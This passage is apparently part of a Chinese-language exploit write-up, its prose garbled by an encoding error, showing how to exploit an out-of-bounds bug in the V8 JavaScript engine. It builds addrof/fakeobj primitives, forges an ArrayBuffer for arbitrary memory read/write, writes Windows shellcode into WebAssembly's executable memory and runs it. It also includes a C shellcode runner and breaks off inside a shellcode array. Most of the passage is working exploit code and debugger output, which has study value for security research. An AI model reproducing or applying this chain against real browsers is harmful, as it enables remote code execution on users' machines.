// è°ƒç”¨ fakeobj å‡½æ•°ï¼Œå¾—åˆ°ä¼ªé€ çš„æ•°ç»„
let fake_obj = fakeobj(fake_obj_tagged_ptr);
%DebugPrint(fake_obj);
// è¯»å–ä¼ªé€ çš„æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ 
console.log(fake_obj[0]);
readline();
```

./d8.exe --allow-natives-sytax poc.js è¿è¡Œåè¾“å‡ºå¦‚ä¸‹:

```bash
8203ae1
8203b31
8049bc9
0x01c908049d09 <JSArray[3]>
8049d09
8049cf1
0x01c908049cf1 <JSArray[6]>
1.6291488275489796e-260
```

![](</assets/images/Pasted image 20220219173826.png>)

### ä»»æ„å†…å­˜è¯»ã€å†™

ç”¨ addrof å’Œ fakeobjï¼Œä¼ªé€ ä¸€ä¸ª [`Uint8Array`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8Array) å¯¹è±¡ï¼Œå°±å¯ä»¥å®ç°ä»»æ„å†…å­˜è¯»å†™ã€‚

å…ˆåˆ†æ `Uint8Array` å¯¹è±¡çš„å†…å­˜å¸ƒå±€ï¼š

```bash
// Debug ç‰ˆè¿è¡Œ
d8> let u8a = new Uint8Array(8)
undefined
d8> %DebugPrint(u8a)
DebugPrint: 000000A408108E21: [JSTypedArray]
 - map: 0x00a4082c24d9 <Map(UINT8ELEMENTS)> [FastProperties]
 - prototype: 0x00a408284efd <Object map = 000000A4082C2501>
 - elements: 0x00a408108e11 <ByteArray[8]> [UINT8ELEMENTS]
 - embedder fields: 2
 - buffer: 0x00a408108dd1 <ArrayBuffer map = 000000A4082C3271>
 - byte_offset: 0
 - byte_length: 8
 - length: 8
 - data_ptr: 000000A408108E18
   - base_pointer: 0000000008108E11
   - external_pointer: 000000A400000007
 - properties: 0x00a40800222d <FixedArray[0]>
 - All own properties (excluding elements): {}
 - elements: 0x00a408108e11 <ByteArray[8]> {
         0-7: 0
 }
 - embedder fields = {
    0, aligned pointer: 0000000000000000
    0, aligned pointer: 0000000000000000
 }
000000A4082C24D9: [Map]
 - type: JS_TYPED_ARRAY_TYPE
 - instance size: 72
 - inobject properties: 0
 - elements kind: UINT8ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x00a4080023b5 <undefined>
 - prototype_validity cell: 0x00a408202405 <Cell value= 1>
 - instance descriptors (own) #0: 0x00a4080021c1 <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x00a408284efd <Object map = 000000A4082C2501>
 - constructor: 0x00a408284e85 <JSFunction Uint8Array (sfi = 000000A408209E01)>
 - dependent code: 0x00a4080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

0,0,0,0,0,0,0,0
```

`Uint8Array` å¯¹åº” `v8::internal::JSTypedArray`ï¼Œåˆ†ææºç å¾—åˆ°å¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼š

- JSTypedArray
	- JSArrayBufferView
		- JSObject
			- map
			- properties
			- elements
		- Buffer: tagged pointer
		- ByteOffset: intptr_t
		- ByteLength: intptr_t
	- Length: intptr_t
	- ExternalPointer: intptr_t
	- BasePointer: Tagged Pointer
	- BitFoeld: int32_t
	- OptionalPadding: å¯¹é½å¡«å……

æŸ¥çœ‹å†…å­˜ï¼š

![](</assets/images/Pasted image 20220219191914.png>)

buffer æŒ‡å‘çš„æ˜¯ä¸ `Uint8Array` å…³è”çš„ `ArrayBuffer` å¯¹è±¡ã€‚`ArrayBuffer` å¯¹åº” `js::internal::JSArrayBuffer`ï¼Œåˆ†ææºç å¾—åˆ°å¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼š

- JSArrayBuffer
	- JSObject
		- map
		- properties
		- elements
	- ByteLength: intptr_t
	- MaxByteLength: intptr_t
	- BackingStore: intptr_t
	- Extension: intptr_t
	- BitField: int32_t
	- OptinalPadding: å¯¹é½å¡«å……


ç”¨è°ƒè¯•å™¨åˆ†æè¿™ä¸¤ä¸ªç±»å‹:

```bash
d8> let buf = new ArrayBuffer(8)
undefined
d8> let u8a = new Uint8Array(buf)
undefined
d8> u8a[0] = 0xaa
170
d8> u8a[1] = 0xbb
187
d8> u8a[2] = 0xcc
204
d8> %DebugPrint(u8a)
DebugPrint: 000000A40810A669: [JSTypedArray]
 - map: 0x00a4082c24d9 <Map(UINT8ELEMENTS)> [FastProperties]
 - prototype: 0x00a408284efd <Object map = 000000A4082C2501>
 - elements: 0x00a408003245 <ByteArray[0]> [UINT8ELEMENTS]
 - embedder fields: 2
 - buffer: 0x00a40810a5bd <ArrayBuffer map = 000000A4082C3271>
 - byte_offset: 0
 - byte_length: 8
 - length: 8
 - data_ptr: 0000021474AB8710
   - base_pointer: 0000000000000000
   - external_pointer: 0000021474AB8710
 - properties: 0x00a40800222d <FixedArray[0]>
 - All own properties (excluding elements): {}
 - elements: 0x00a408003245 <ByteArray[0]> {
           0: 170
           1: 187
           2: 204
         3-7: 0
 }
 - embedder fields = {
    0, aligned pointer: 0000000000000000
    0, aligned pointer: 0000000000000000
 }
000000A4082C24D9: [Map]
 - type: JS_TYPED_ARRAY_TYPE
 - instance size: 72
 - inobject properties: 0
 - elements kind: UINT8ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x00a4080023b5 <undefined>
 - prototype_validity cell: 0x00a408202405 <Cell value= 1>
 - instance descriptors (own) #0: 0x00a4080021c1 <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x00a408284efd <Object map = 000000A4082C2501>
 - constructor: 0x00a408284e85 <JSFunction Uint8Array (sfi = 000000A408209E01)>
 - dependent code: 0x00a4080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

170,187,204,0,0,0,0,0

	d8> %DebugPrint(buf)
DebugPrint: 000000A40810A5BD: [JSArrayBuffer]
 - map: 0x00a4082c3271 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x00a40828a129 <Object map = 000000A4082C3299>
 - elements: 0x00a40800222d <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0000021474AB8710
 - byte_length: 8
 - max_byte_length: 8
 - detachable
 - properties: 0x00a40800222d <FixedArray[0]>
 - All own properties (excluding elements): {}
 - embedder fields = {
    0, aligned pointer: 0000000000000000
    0, aligned pointer: 0000000000000000
 }
000000A4082C3271: [Map]
 - type: JS_ARRAY_BUFFER_TYPE
 - instance size: 64
 - inobject properties: 0
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x00a4080023b5 <undefined>
 - prototype_validity cell: 0x00a408202405 <Cell value= 1>
 - instance descriptors (own) #0: 0x00a4080021c1 <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x00a40828a129 <Object map = 000000A4082C3299>
 - constructor: 0x00a40828a055 <JSFunction ArrayBuffer (sfi = 000000A40820EB31)>
 - dependent code: 0x00a4080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[object ArrayBuffer]
```

JSTypedArray:

![](</assets/images/Pasted image 20220219195501.png>)

JSArrayBuffer:

![](</assets/images/Pasted image 20220219200057.png>)

BackingStore:

![](</assets/images/Pasted image 20220219200218.png>)

`JSArrayBuffer` çš„ BackStore åº”è¯¥æ˜¯ç¼“å†²åŒºçš„å®é™…æŒ‡é’ˆäº†ã€‚åœ¨è°ƒè¯•å™¨é‡ŒæŠŠ BackStore çš„åœ°å€ +4ï¼Œçœ‹çœ‹è¯»å–åˆ°çš„æ•°æ®æ˜¯å¦å˜åŒ–ã€‚

![](</assets/images/Pasted image 20220219200616.png>)

```bash
d8> u8a[0] = 0xdd
221
d8> u8a[0]
221
d8> u8a
221,187,204,0,0,0,0,0
```

æ²¡æœ‰è¾¾åˆ°é¢„æœŸçš„æ•ˆæœï¼Œåˆ†æä¸‹åŸå› ï¼Œbacking_store çš„å¼€å§‹ï¼Œåˆ›å»ºå†…å­˜å†™å…¥æ–­ç‚¹ï¼Œä¹‹åæ‰§è¡Œ ua8[0] = 0xddã€‚ç¨‹åºæ–­ä¸‹ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š

![](</assets/images/Pasted image 20220220142131.png>)

åˆ†æè°ƒç”¨æ ˆåï¼Œå‘ç°å†™å…¥åœ°å€æ˜¯ `JSTypedArray::DataPtr()` è·å–çš„ï¼š

```cpp
void* JSTypedArray::DataPtr() {
  // Zero-extend Tagged_t to Address according to current compression scheme
  // so that the addition with |external_pointer| (which already contains
  // compensated offset value) will decompress the tagged value.
  // See JSTypedArray::ExternalPointerCompensationForOnHeapArray() for details.
  STATIC_ASSERT(kOffHeapDataPtrEqualsExternalPointer);
  return reinterpret_cast<void*>(external_pointer() +
                                 static_cast<Tagged_t>(base_pointer().ptr()));
}
```

ç”± `external_pointer` å’Œ `base_pointer` ä¸¤é¡¹ç›¸åŠ å¾—å‡ºï¼Œå¹¶ä¸ä¼šè®¿é—® `ArrayBuffer` çš„ `backing_store`ã€‚æ¨æµ‹æ˜¯ `ArrayBuffer` å†…éƒ¨çš„ç¼“å†²åŒºå·²ç»è¢«æå‰æ‹·è´åˆ° `TypedArray` ç»“æ„ä¸­äº†ï¼Œè¿™æ ·çš„è¯æ–°å»ºä¸€ä¸ª `UInt8Array` åº”è¯¥æ˜¯å¯ä»¥çš„ã€‚

```bash
d8> u8a2 = new Uint8Array(buf)
0,0,0,0,253,253,253,253
d8> u8a2[0] = 0xdd
221
d8> u8a2[0]
221
d8> u8a
221,187,204,0,221,0,0,0
```

![](</assets/images/Pasted image 20220219201551.png>)

### ä»»æ„å†…å­˜è¯»å†™

ä¼ªé€  `ArrayBuffer` å®ç°ä»»æ„å†…å­˜è¯»å†™ï¼Œåˆ†æˆä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼š

- è¯»å– `ArrayBuffer` çš„ map
- æ•°ç»„ä¸­ä¼ªé€ å‡º `ArrayBuffer`
- åˆ©ç”¨ `fakeobj` å‡½æ•°ï¼Œå¾—åˆ°ä¼ªé€  `ArrayBuffer` å¯¹è±¡

è¯»å– `ArrayBuffer` çš„ map çš„æ–¹æ³•å’Œè¯»å–å¯¹è±¡æ•°ç»„çš„ç±»ä¼¼ï¼Œåˆ›å»ºä¸€ä¸ªåŒ…å« 4 ä¸ªå…ƒç´ çš„å¯¹è±¡æ•°ç»„å’Œä¸€ä¸ª `ArrayBuffer`ï¼Œè¿™æ ·å¯¹è±¡æ•°ç»„çš„ `oob` å‡½æ•°å°±å¯ä»¥è¯»åˆ° `ArrayBuffer` çš„ mapã€‚

```javascript
function read_array_buffer_map() {
  obj = {}
  obj_arr = [obj, obj, obj, obj]
  arr_buf = new ArrayBuffer();
  map = obj_arr.oob();
  console.log(ftoi(map).toString(16));
  console.log(addrof(arr_buf).toString(16));
  %DebugPrint(obj_arr);
  %DebugPrint(arr_buf);
	return map;
}

arr_buf_map = read_array_buffer_map();

/*
è¾“å‡º:
800222d08203271
804aa9d
0x03ee0804aa8d <JSArray[4]>
0x03ee0804aa9d <ArrayBuffer map = 000003EE08203271>
*/
```

æ¥ä¸‹æ¥åœ¨æ•°ç»„ä¸­ä¼ªé€ å‡ºä¸€ä¸ª `ArrayBuffer`ï¼Œ`ArrayBuffer` æ€»è®¡ `0x30` å­—èŠ‚ï¼Œåˆ›å»ºä¸€ä¸ª `6` ä¸ªå…ƒç´ çš„æµ®ç‚¹æ•°æ•°ç»„å°±åº”è¯¥è¶³å¤Ÿäº†ï¼Œä½†æ˜¯å¦‚æœä»å…ƒç´  `0` å¼€å§‹å¸ƒå±€å†…å­˜çš„è¯ï¼ŒByteLengthã€MaxByteLengthã€BackingStore ç­‰å…ƒç´ ï¼Œæ‰€åœ¨çš„ä½ç½®å°±ä¼šæ¨ªè·¨ä¸¤ä¸ªæ•°ç»„ä¸‹æ ‡ï¼Œèµ‹å€¼æœ‰äº›ä¸æ–¹ä¾¿ã€‚å¦‚æœæŠŠ `ArrayBuffer` çš„ mapï¼Œæ”¾åœ¨æµ®ç‚¹æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„é«˜ `32 `ä½ï¼Œä¼šæ›´æ–¹ä¾¿ä¸€äº›ï¼Œè¿™å°±éœ€è¦åˆ›å»ºä¸€ä¸ª `7` ä¸ªå…ƒç´ çš„æµ®ç‚¹æ•°ç»„ã€‚

```javascript
// ä¼ªé€ ä»»æ„ArrayBuffer
function fake_array_buffer(addr, len) {
  double_arr = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7];
  // [0x00000000, Map]
  double_arr[0] = itof(ftoi(arr_buf_map) << BigInt(32))
  // [props, elems] ä¸å½±å“åˆ©ç”¨,å¡«0
  double_arr[1] = itof(make_qword(0, 0));
  // [ByteLenghLow, ByteLengthHigh]
  double_arr[2] = itof(BigInt(len))
  // [MaxByteLengthLow, MaxByteLengthHigh]
  double_arr[3] = itof(BigInt(len))
  // [BackingStoreLow, BackingStoreHigh]
  double_arr[4] = itof(BigInt(addr))

  addr_fake_arr_buf_end = addr_double_arr_begin = addrof(double_arr);
  %DebugPrint(double_arr);
  console.log(addr_fake_arr_buf_end.toString(16))
	// 7ä¸ªå…ƒç´ çš„doubleæ•°ç»„, sizeof(ArrayBuffer)ä»…å 6ä¸ªï¼Œåœ¨Arrayå’ŒArrayBufferï¼Œæœ‰4å­—èŠ‚å¤§å°çš„å†—ä½™ç©ºé—´æ²¡æœ‰ä½¿ç”¨
	// sizeof(ArrayBuffer) + 4
  addr_fake_arr_buf_begin = addr_fake_arr_buf_end - BigInt(0x30 + 0x4);
  console.log(addr_fake_arr_buf_begin.toString(16));
  return fakeobj(addr_fake_arr_buf_begin);
}

fake_buf_0_3000 = fake_array_buffer(0, 3000);
%DebugPrint(fake_buf_0_3000);
```

è¿è¡Œç»“æœå¦‚ä¸‹ï¼š

```bash
0x026c0804b331 <JSArray[7]>
804b331
804b2fd
0x026c0804b2fd <ArrayBuffer map = 0000026C08203271>
```

åˆ›å»ºå‡ºå¯¹åº”çš„ `Uint8Array`ã€‚

```javascript
view = new Uint8Array(fake_buf_0_3000)
```

è°ƒè¯•è¿è¡Œï¼Œå‘ç”Ÿå¼‚å¸¸ï¼š

``` cpp
#
# Fatal error in , line 0
# Check failed: 0 == array_buffer->byte_length().
#
#
#
#FailureMessage Object: 000000792BFFDD40
==== C stack trace ===============================

v8::base::debug::StackTrace::StackTrace [0x00007FF605911A5B+27] (C:\Users\MSI-NB\workspace\depot_tools\chromium\v8\src\base\debug\stack_trace_win.cc:173)
v8::platform::`anonymous namespace'::PrintStackTrace [0x00007FF6058AF237+39] (C:\Users\MSI-NB\workspace\depot_tools\chromium\v8\src\libplatform\default-platform.cc:28)
V8_Fatal [0x00007FF6058A7FE9+217] (C:\Users\MSI-NB\workspace\depot_tools\chromium\v8\src\base\logging.cc:166)
v8::internal::Runtime_GrowableSharedArrayBufferByteLength [0x00007FF60539CF3C+540] (C:\Users\MSI-NB\workspace\depot_tools\chromium\v8\src\runtime\runtime-typedarray.cc:56)
(No symbol) [0x0000039A000BDFDC]
```

æ ¹æ®å¼‚å¸¸æ—¥å¿—å’Œè°ƒç”¨æ ˆï¼Œå®šä½åˆ°å¦‚ä¸‹å‡½æ•°ï¼š

```cpp
RUNTIME_FUNCTION(Runtime_GrowableSharedArrayBufferByteLength) {
  HandleScope scope(isolate);
  DCHECK_EQ(1, args.length());
  CONVERT_ARG_HANDLE_CHECKED(JSArrayBuffer, array_buffer, 0);

  CHECK_EQ(0, array_buffer->byte_length()); // ==> è¿™ä¸ªæ£€æŸ¥æ²¡æœ‰é€šè¿‡
  size_t byte_length = array_buffer->GetBackingStore()->byte_length();
  return *isolate->factory()->NewNumberFromSize(byte_length);
}
```

æŠŠ ByteLength æ”¹æˆ 0 åï¼Œ`GetBackingStore()` ä¸­åˆä¼šè§¦å‘å…¶ä»–å¼‚å¸¸ï¼Œæœ‰å¿…è¦æ·±å…¥åˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„é€»è¾‘ã€‚åˆ†ææ­£å¸¸çš„ `ArrayBuffer` è®¿é—®æµç¨‹ä½œä¸ºå‚ç…§ï¼Œå‘ç°ç¨‹åºæ˜¯ä¸ä¼šèµ°åˆ°`Runtime_GrowableSharedArrayBufferByteLength` çš„ã€‚æ¨æµ‹æ˜¯å¡« 0 å¤„ç†éšè—äº†çœŸæ­£çš„é”™è¯¯ï¼ŒæŠŠä¹‹å‰å¡« 0 çš„åœ°æ–¹å…¨éƒ½å¡«ä¸Šäº† 0xCC å†è¿è¡Œè„šæœ¬ï¼Œå‘ç°é—®é¢˜è§£å†³äº†ï¼Œä¸å†å‡ºç°å¼‚å¸¸äº†ã€‚

æ‰§è¡Œ `view[0] = 0xAA;`ï¼Œè§¦å‘äº† 0x0 åœ°å€è®¿é—®å¼‚å¸¸ï¼Œè¯æ˜æˆ‘ä»¬ä¼ªé€ çš„ `ArrayBuffer` å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ã€‚

### ä»£ç æ‰§è¡Œ

æ¥ä¸‹æ¥å°±å¯ä»¥å®ç°ä»£ç æ‰§è¡Œäº†ã€‚ä»£ç æ‰§è¡Œçš„å®ç°ï¼Œåˆ†æˆä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼š

- åˆ›å»º [WebAssembly](https://developer.mozilla.org/zh-CN/docs/WebAssembly/Concepts) å®ä¾‹
- è¯»å– WASM æ¨¡å—å¯¼å‡ºå‡½æ•°æ‰€åœ¨ RWX å†…å­˜åŒºçš„åœ°å€
- åˆ©ç”¨ä»»æ„åœ°å€è¯»å†™èƒ½åŠ›ï¼Œå°† shellcode å†™å…¥å¯æ‰§è¡Œçš„å†…å­˜
- è°ƒç”¨ WASM å¯¼å‡ºå‡½æ•°ï¼Œè§¦å‘ shellcode æ‰§è¡Œ

ä½¿ç”¨åœ¨çº¿å·¥å…· [WasmFiddle](https://wasdk.github.io/WasmFiddle/)ï¼Œè·å– WASM å­—èŠ‚ç ã€‚ç”¨ä¸‹é¢çš„ä»£ç å®ä¾‹åŒ– WASM æ¨¡å—ï¼š

```javascript
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
```

åœ¨æºç ä¸­ç¬¦ä¸²æœç´¢ï¼Œå¯ä»¥æ‰¾åˆ°æ‰¾åˆ°äº† WebAssembly ç¼–è¯‘æ‰§è¡Œä¸­ç”¨åˆ°çš„ä¸¤ä¸ªå…³é”®å‡½æ•°`WebAssemblyModule` å’Œ `WebAssemblyInstance`ã€‚è°ƒè¯•è¿™ä¸¤ä¸ªå‡½æ•°, æœ€åæ‰¾åˆ°`WasmInstanceObject` å¯¹è±¡çš„ `kJumpTableStartOffset` (`0x00000068`) åç§»å¤„å­˜æ”¾äº† RWX å†…å­˜åŒºçš„åœ°å€ã€‚

è¯»å‡º `WasmInstanceObject` å¯¹è±¡ä¸­å­˜å‚¨çš„ RWX å†…å­˜åŒºåœ°å€ï¼š

```javascript
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);

%DebugPrint(wasmInstance);
instance_start = addrof(wasmInstance);
console.log(instance_start.toString(16));
instruction_ptr = instance_start + BigInt(0x68);
console.log(instruction_ptr.toString(16));
fake_fixed_array_ptr = instruction_ptr - BigInt(0x8)

buf_for_fake_arr = [1.1, 1.2]
// [double_array_map, props]
buf_for_fake_arr[0] = itof(make_qword(double_array_map, 0));
// [elems, len]
buf_for_fake_arr[1] = itof(make_qword(fake_fixed_array_ptr, 8 << 1));

start_ptr_of_fake_arr = addrof(buf_for_fake_arr) - BigInt(0x10);
instruction_ptr_reader = fakeobj(start_ptr_of_fake_arr);

console.log(ftoi(instruction_ptr_reader[0]).toString(16));
```

è¾“å‡ºï¼š

```bash
0x02f8081d4ba1 <Instance map = 000002F808206F61>
81d4ba1
81d4c09
be50a41000
```

ä¼ªé€  `ArrayBuffer`ï¼ŒæŠŠ shellcode æ‹·è´åˆ° `be50a41000`ï¼Œå†è°ƒç”¨ WebAssembly å—å¯¼å‡ºçš„ `main` å‡½æ•°ï¼Œå®é™…ä¸Šæ‰§è¡Œçš„å°±æ˜¯ shellcode äº†ã€‚

ç”¨ 0xCC ä½œä¸º shellcode éªŒè¯æ•ˆæœï¼š

```javascript
instruction_ptr = ftoi(instruction_ptr_reader[0]);
console.log(instruction_ptr.toString(16));

shellcode_zone = new Uint8Array(fake_array_buffer(instruction_ptr, 1));
shellcode_zone[0] = 0xcc;

wasmInstance.exports.main()
```

æˆåŠŸæ‰§è¡Œåˆ°0xCCï¼Œè§¦å‘ä¸­æ–­ã€‚

![](</assets/images/Pasted image 20220224014552.png>)

ä» [github](https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode) æ‰¾äº†ä¸€ä¸ªå¼¹è®¡ç®—å™¨çš„shellcode, æŠŠ c ä»£ç éƒ¨åˆ†ç¼–è¯‘æˆ exeï¼Œç„¶ååç”¨
ida æå–å‡º shellcodeã€‚

![](</assets/images/Pasted image 20220224221352.png>)

æ¯•ç«Ÿæ˜¯ç½‘ä¸Šæ‰¾çš„ shellcodeï¼Œå…ˆå•æ­¥è°ƒè¯•ä¸€éçš„ï¼ŒéªŒè¯å®‰å…¨æ€§ã€‚åœ¨æ•°ç»„å¼€å¤´åŠ ä¸Š 0xCCï¼Œä¾¿äºè°ƒè¯•ã€‚

```javascript
shellcode_zone = new Uint8Array(fake_array_buffer(instruction_ptr, 1024));

shellcode_src = new Uint8Array([0xcc, 0x48, 0x31, 0xFF, 0x48, 0xF7, 0xE7, 0x65, 0x48, 0x8B, 0x58,
  0x60, 0x48, 0x8B, 0x5B, 0x18, 0x48, 0x8B, 0x5B, 0x20, 0x48,
  0x8B, 0x1B, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x5B, 0x20, 0x49,
  0x89, 0xD8, 0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31,
  0xC9, 0x66, 0x81, 0xC1, 0xFF, 0x88, 0x48, 0xC1, 0xE9, 0x08,
  0x8B, 0x14, 0x0B, 0x4C, 0x01, 0xC2, 0x4D, 0x31, 0xD2, 0x44,
  0x8B, 0x52, 0x1C, 0x4D, 0x01, 0xC2, 0x4D, 0x31, 0xDB, 0x44,
  0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4D, 0x31, 0xE4, 0x44,
  0x8B, 0x62, 0x24, 0x4D, 0x01, 0xC4, 0xEB, 0x32, 0x5B, 0x59,
  0x48, 0x31, 0xC0, 0x48, 0x89, 0xE2, 0x51, 0x48, 0x8B, 0x0C,
  0x24, 0x48, 0x31, 0xFF, 0x41, 0x8B, 0x3C, 0x83, 0x4C, 0x01,
  0xC7, 0x48, 0x89, 0xD6, 0xF3, 0xA6, 0x74, 0x05, 0x48, 0xFF,
  0xC0, 0xEB, 0xE6, 0x59, 0x66, 0x41, 0x8B, 0x04, 0x44, 0x41,
  0x8B, 0x04, 0x82, 0x4C, 0x01, 0xC0, 0x53, 0xC3, 0x48, 0x31,
  0xC9, 0x80, 0xC1, 0x07, 0x48, 0xB8, 0x0F, 0xA8, 0x96, 0x91,
  0xBA, 0x87, 0x9A, 0x9C, 0x48, 0xF7, 0xD0, 0x48, 0xC1, 0xE8,
  0x08, 0x50, 0x51, 0xE8, 0xB0, 0xFF, 0xFF, 0xFF, 0x49, 0x89,
  0xC6, 0x48, 0x31, 0xC9, 0x48, 0xF7, 0xE1, 0x50, 0x48, 0xB8,
  0x9C, 0x9E, 0x93, 0x9C, 0xD1, 0x9A, 0x87, 0x9A, 0x48, 0xF7,
  0xD0, 0x50, 0x48, 0x89, 0xE1, 0x48, 0xFF, 0xC2, 0x48, 0x83,
  0xEC, 0x20, 0x41, 0xFF, 0xD6]);

for(let i = 0; i < shellcode_src.length; ++i) {
  shellcode_zone[i] = shellcode_src[i]
}
wasmInstance.exports.main()
```

è°ƒè¯•ä¸€ä¸‹ç¡®å®å‘ç°äº†é—®é¢˜ï¼Œä¸è¿‡å¹¶ä¸æ˜¯å®‰å…¨é—®é¢˜ï¼Œæ˜¯ `WinExec` è¿è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿäº†å†…å­˜è®¿é—®å¼‚å¸¸ã€‚

![](</assets/images/Pasted image 20220224221751.png>)

ä½†æ˜¯è¿™ä¸ªç›®çš„åœ°å€æ˜¯å¯ä»¥è®¿é—®çš„ï¼Œè¿™æ˜¯ä»€ä¹ˆæ–°å‹æ”»å‡»æ‰‹æ³•ï¼Ÿä»”ç»†çœ‹ä¸‹å‘ç°æ˜¯å› ä¸º movqs æ˜¯ä¸€æ¡ SIMD æŒ‡ä»¤ï¼Œè¦æ±‚æ“ä½œæ•°çš„åœ°å€ 16 å­—èŠ‚å¯¹é½ã€‚

ä¿®æ”¹ shellcode çš„æºç ï¼Œç¡®ä¿è°ƒç”¨ `WinExec` ä¹‹å‰ rsp æ˜¯ 16 å­—èŠ‚å¯¹é½çš„ï¼š

```c
// runShellcode.c
// C Shellcode Run Code referenced from reenz0h (twitter: @sektor7net)
#include <windows.h>
void main() {
  void* exec;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;
  // Shellcode
  unsigned char payload[] =
    "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
    "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
    "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
    "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
    "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
    "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
    "\x48\x83\xec\x30\x66\x81\xe4\xf0\xff\x41\xff\xd6";

  unsigned int payload_len = 205;
  exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  RtlMoveMemory(exec, payload, payload_len);
  rv = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
  th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
  WaitForSingleObject(th, -1);
}
```

```javascript
shellcode_src = new Uint8Array([0xcc,
 0x48, 0x31, 0xFF, 0x48, 0xF7, 0xE7, 0x65, 0x48, 0x8B, 0x58,
  0x60, 0x48, 0x8B, 0x5B, 0x18, 0x48, 0x8B, 0x5B, 0x20, 0x48,
  0x8B, 0x1B, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x5B, 0x20, 0x49,
  0x89, 0xD8, 0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31,
  0xC9, 0x66, 0x81, 0xC1, 0xFF, 0x88, 0x48, 0xC1, 0xE9, 0x08,
  0x8B, 0x14, 0x0B, 0x4C, 0x01, 0xC2, 0x4D, 0x31, 0xD2, 0x44,
  0x8B, 0x52, 0x1C, 0x4D, 0x01, 0xC2, 0x4D, 0x31, 0xDB, 0x44,
  0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4D, 0x31, 0xE4, 0x44,
  0x8B, 0x62, 0x24, 0x4D, 0x01, 0xC4, 0xEB, 0x32, 0x5B, 0x59,
  0x48, 0x31, 0xC0, 0x48, 0x89, 0xE2, 0x51, 0x48, 0x8B, 0x0C,
  0x24, 0x48, 0x31, 0xFF, 0x41, 0x8B, 0x3C, 0x83, 0x4C, 0x01,
  0xC7, 0x48, 0x89, 0xD6, 0xF3, 0xA6, 0x74, 0x05, 0x48, 0xFF,
  0xC0, 0xEB, 0xE6, 0x59, 0x66, 0x41, 0x8B, 0x04, 0x44, 0x41,
